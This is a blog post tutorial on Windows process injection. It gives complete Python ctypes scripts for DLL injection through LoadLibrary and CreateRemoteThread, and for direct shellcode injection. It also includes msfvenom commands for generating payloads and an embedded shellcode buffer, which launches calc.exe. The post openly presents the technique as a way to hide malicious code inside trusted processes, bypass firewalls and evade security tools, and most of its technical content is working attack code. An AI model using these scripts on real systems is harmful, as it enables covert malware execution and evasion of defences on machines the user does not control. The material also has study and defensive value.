---
layout: post
title:  "Process injection"
date:   2017-05-12
summary: Process injection is a method used by malware authors and hackers to execute code within the context of another process. This technique is often used to conceal actions, bypass firewalls and evade other security defences. This post covers DLL injection using LoadLibrary and direct injection using shellcode.
---

### What is process injection
Process injection is a method used by malware authors and hackers to execute code within the context of another process. This gives the code executing the same security privileges as the process its injected into. The technique is often used to conceal actions performed by the code and evade detection. 

### Why use it
Because the injected code runs in the context of the process its injected into it can be used to bypass firewall settings and evade further analysis. For example if we inject into a browser or an application that is trusted to access the internet the traffic will not be blocked as the process is trusted to perform this action.

This makes process injection an ideal tool when hacking as it can bypass firewalls and evade other security defences, making a compromised machine harder to detect.

### Types of injection
There are a few different techniques used to inject code into a remote process and have it execute. DLL injection is a classic on Windows but often involves writing a DLL to disk. Direct code injection is another more common method. We will cover both of these techniques in this post.

Some techniques involve writing a file to disk, others copy code directly into a process. Most of the techniques follow a pattern, they allocate space within a target process, write data to perform the injection and get the process to somehow execute that code.

### Payloads
To test our scripts out we will use msfvenom to generate payloads to be injected. Msfvenom is part of the Metasploit framework used to generate shellcode payloads and encode them, it can also generate binary files such as .exe and .dll.

    <figure class="lineno-container">
    {% highlight python linenos=table %}
    # used for DLL injection
    msfvenom -a x86 --platform windowns -p windows/exec CMD=calc.exe -f dll -o payload.dll
    # used for direct code injection
    msfvenom -a x86 --platform windowns -p windows/exec CMD=calc.exe -f python -o payload.py
    {% endhighlight %}
    </figure>

## DLL Injection
DLL injection is a classic method used on windows, it basically forces a process to load a malicious DLL, once loaded DLLMain is executed automatically by the OS which executes the payload. So in order to perform DLL injection we just need to get the target process to call the LoadLibrary function.

The first thing we need is a handle to the process we want to inject into, we also need to specify the access required in order to allocate and write memory. 

{% highlight python %}
hprocess = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, PID)
{% endhighlight %}

Next we need to allocate memory and write our DLL path to the target process.

<figure class="lineno-container">
{% highlight python linenos=table %}
baseaddr = windll.kernel32.VirtualAllocEx(hprocess, None, len(DLLPATH), MEM_COMMIT_RESERVE, PAGE_READWRITE)
windll.kernel32.WriteProcessMemory(hprocess, baseaddr, DLLPATH, len(DLLPATH), byref(BYTES_WRITTEN))
{% endhighlight %}
</figure>

Now we just need to get the process to call loadlibrary. To do this we can use the CreateRemoteThread function. As the name implies it creates a remote thread in a target process. The main two arguments for it are the start address of the code, and a pointer to parameters to be passed to the new thread. We will use it to call LoadLibrary and pass the DLL name as a parameter. This is what forces the remote process to load a malicious DLL.

However we fist need to resolve the address of LoadLibrary so we can pass it to CreateRemoteThread. To do this we need to call GetModuleHandle to get a handle to the Kernel32.dll which exports the LoadLibrary function. Once we have a handle to it we can resolve the functions address by using GetProcAddress. Now that we know the address of LoadLibrary we can pass it as the startaddress to CreateRemoteThread with a pointer to the malicious DLL path name in memory as the parameter. 

<figure class="lineno-container">
{% highlight python linenos=table %}
hmodule = windll.kernel32.GetModuleHandleA("kernel32.dll")
loadlibraryaddr = windll.kernel32.GetProcAddress(hmodule, "LoadLibraryA")
windll.kernel32.CreateRemoteThread(hprocess, None, 0, loadlibraryaddr, baseaddr, 0, byref(THREAD_ID))
{% endhighlight %}
</figure>

The following is the full code to perform DLL injection using loadlibrary:

<figure class="lineno-container">
{% highlight python linenos=table %}
from ctypes import *
import sys

PROCESS_ALL_ACCESS = 0x001F0FFF
MEM_COMMIT_RESERVE = ( 0x1000 | 0x2000 )
PAGE_READWRITE     = 0x04
BYTES_WRITTEN      = c_int(0)
THREAD_ID          = c_ulong(0)

DLLPATH = 'C:\\Users\\IEUser\\Desktop\\process-injection\\payloads\\payload.dll'

PID = int(input("Enter PID to inject into: "))

# Get handle to process
hprocess = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, PID)
if not hprocess:
    print(WinError())
    sys.exit(0)

# Allocates space for DLL path string
baseaddr = windll.kernel32.VirtualAllocEx(hprocess, None, len(DLLPATH), MEM_COMMIT_RESERVE, PAGE_READWRITE)
print(WinError())

# Writes DLL path to that memory
windll.kernel32.WriteProcessMemory(hprocess, baseaddr, DLLPATH, len(DLLPATH), byref(BYTES_WRITTEN))
print(WinError())

# Gets a handle to kernel32.dll
hmodule = windll.kernel32.GetModuleHandleA("kernel32.dll")
# Resolve loadlibrary address
loadlibraryaddr = windll.kernel32.GetProcAddress(hmodule, "LoadLibraryA")

# Create remote thread to execute loadlibrary
if not windll.kernel32.CreateRemoteThread(hprocess, None, 0, loadlibraryaddr, baseaddr, 0, byref(THREAD_ID)):
    print(WinError())
    sys.exit(0)
print("Thread ID: 0x%08x" % THREAD_ID.value)
{% endhighlight %}
</figure>

Once the DLL is loaded DLLMain is executed by the OS which will contain a payload of malicious code. Because loadlibrary is used to load the DLL it could be spotted, either by anti-virus or by other security monitoring tools. If we view the process using process explorer we can see the DLL is loaded within the process. To be more covert we can use another method of process injection called direct injection. 

## Direct injection
Direct code injection involves directly injecting code into the process rather than forcing a DLL to load. Most of the api calls are the same except that we don't need to get the loadlibrary address. The payload for this type of injection is typically shellcode rather than a PE or DLL as it takes up less space. 

Full code for direct injection:

<figure class="lineno-container">
{% highlight python linenos=table %}
from ctypes import *
import sys

PROCESS_ALL_ACCESS = 0x001F0FFF
MEM_COMMIT_RESERVE = ( 0x1000 | 0x2000 )
PAGE_READWRITE     = 0x40
BYTES_WRITTEN      = c_int(0)
THREAD_ID          = c_ulong(0)

PID = int(input("Enter PID to inject into: "))

buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

# Get handle to process
hprocess = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, PID)
if not hprocess:
    print(WinError())
    sys.exit(0)

# Allocates space for shellcode
baseaddr = windll.kernel32.VirtualAllocEx(hprocess, None, len(buf), MEM_COMMIT_RESERVE, PAGE_READWRITE)
print(WinError())

# Writes shellcode to that memory
windll.kernel32.WriteProcessMemory(hprocess, baseaddr, buf, len(buf), byref(BYTES_WRITTEN))
print(WinError())

# Create remote thread to execute that code
if not windll.kernel32.CreateRemoteThread(hprocess, None, 0, baseaddr, 0, 0, byref(THREAD_ID)):
    print(WinError())
    sys.exit(0)
print("Thread ID: 0x%08x" % THREAD_ID.value)
{% endhighlight %}
</figure>

This injection method follows the same pattern of code, OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread. Except this time when calling CreateRemoteThread we pass the startaddress as the memory we just allocated.

There are a few changes, PAGE_READWRITE has been changed to 0x40 which enables execute/read/write for the memory being allocated. And the calls to GetModuleHandle and GetProcAddress have been removed as they are not needed here.

There are other more complex methods of injecting code into a process and getting the process to execute it, these will be covered in a later post. If your looking for more info on process injection check out the references.

## References
<https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process>

<https://www.endgame.com/blog/technical-blog/hunting-memory>

<https://www.christophertruncer.com/injecting-shellcode-into-a-remote-process-with-python/>

<http://rwnin.net/?p=5>

<http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html>

<https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html>
